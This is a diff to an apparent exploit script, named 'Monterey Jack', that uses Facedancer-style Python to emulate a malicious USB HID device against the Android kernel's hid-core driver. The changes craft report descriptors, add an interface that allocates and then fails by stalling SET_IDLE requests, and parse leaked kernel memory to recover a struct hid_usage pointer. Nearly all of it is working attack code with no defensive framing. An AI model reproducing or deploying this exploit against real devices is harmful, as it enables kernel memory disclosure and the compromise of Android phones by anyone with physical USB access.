@@ -45,7 +45,7 @@ class InitialHIDReportDescriptor(HIDReportDescriptor):
 
         # https://cs.android.com/android/kernel/superproject/+/common-android-mainline:common/drivers/hid/hid-core.c;l=126;drc=c600a55922640b1c4dcfdc5a694cadd2dd9d1599
         USAGE_MINIMUM    (0),
-        USAGE_MAXIMUM    (0x00, 0x02),
+        USAGE_MAXIMUM    (0x50, 0x02),
         LOGICAL_MINIMUM (0),
         LOGICAL_MAXIMUM (0),
         REPORT_SIZE      (32),
@@ -53,7 +53,7 @@ class InitialHIDReportDescriptor(HIDReportDescriptor):
         INPUT            (variable=True),
 
         USAGE_MINIMUM    (0),
-        USAGE_MAXIMUM    (0x00, 0x02),
+        USAGE_MAXIMUM    (0x50, 0x02),
         LOGICAL_MINIMUM (0),
         LOGICAL_MAXIMUM (0),
         REPORT_SIZE      (32),
@@ -61,7 +61,7 @@ class InitialHIDReportDescriptor(HIDReportDescriptor):
         INPUT            (variable=True),
 
         USAGE_MINIMUM    (0),
-        USAGE_MAXIMUM    (0x00, 0x02),
+        USAGE_MAXIMUM    (0x50, 0x02),
         LOGICAL_MINIMUM (0),
         LOGICAL_MAXIMUM (0),
         REPORT_SIZE      (32),
@@ -159,10 +159,30 @@ class InitialHIDUSBDevice(USBDevice):
     vendor_id: int = 0x1337
     product_id: int = 0xbeef
     class KeyboardConfiguration(USBConfiguration):
-        class MultitouchDumpAInterface(USBInterface):
+        class AllocateThenFailInterface(USBInterface):
             class_number : int = USBDeviceClass.HID
             class KeyEventEndpoint(USBEndpoint):
                 number        : int             = 3
+                direction     : USBDirection    = USBDirection.IN
+                transfer_type : USBTransferType = USBTransferType.INTERRUPT
+                interval      : int             = 10
+            class USBClassDescriptor(USBClassDescriptor):
+                number      : int   =  USBDescriptorTypeNumber.HID
+                raw         : bytes = b'\x09\x21\x10\x01\x00\x01\x22' + struct.pack("<H", len(InitialHIDReportDescriptor()()))
+            class ReportDescriptor(InitialHIDReportDescriptor):
+                pass
+
+            @class_request_handler(number=HID_REQ_SET_IDLE)
+            @to_this_interface
+            def handle_get_interface_request(self, request):
+                # Silently stall HID_REQ_SET_IDLE class requests.
+                request.stall()
+
+        class MultitouchDumpAInterface(USBInterface):
+            class_number : int = USBDeviceClass.HID
+            number: int = 1
+            class KeyEventEndpoint(USBEndpoint):
+                number        : int             = 4
                 direction     : USBDirection    = USBDirection.IN
                 transfer_type : USBTransferType = USBTransferType.INTERRUPT
                 interval      : int             = 10
@@ -190,7 +210,14 @@ class InitialHIDUSBDevice(USBDevice):
                 # we only bother to leak 256 bytes - good enough...
                 outdata = bytearray(256)
                 request.reply(outdata)
-                print(outdata)
+                print(outdata.hex(' ', 4))
+                # 8 bytes of header, then the leaked struct hid_usage
+                # unsigned application // 0x8
+                # struct hid_usage *usage // 0x10
+                application = struct.unpack("<I", outdata[0x8+0x8:0x8+0x8+0x4])[0]
+                usage_ptr = struct.unpack("<Q", outdata[0x8+0x10:0x8+0x10+0x8])[0]
+                print(hex(application), hex(usage_ptr))
+                # application should be 0x10006 (GENERIC_DESKTOP, KEYBOARD)
 
 async def run_monterey_jack():
     logging.info("Beginning Monterey Jack...")
